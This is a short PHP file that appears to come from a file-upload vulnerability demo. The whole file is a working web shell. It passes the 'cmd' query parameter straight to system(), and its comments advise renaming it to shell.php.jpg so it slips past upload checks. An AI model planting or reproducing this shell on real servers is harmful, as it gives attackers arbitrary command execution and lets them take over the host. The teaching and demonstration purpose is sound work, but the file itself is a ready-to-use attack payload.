<?php
// The attacker's "fake selfie". Rename to shell.php.jpg during demo
// if you want to also show a Content-Type spoof; the base demo just
// keeps it as shell.php because upload.php trusts the extension.
echo "<pre>";
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
} else {
    echo "shell online. use ?cmd=id";
}
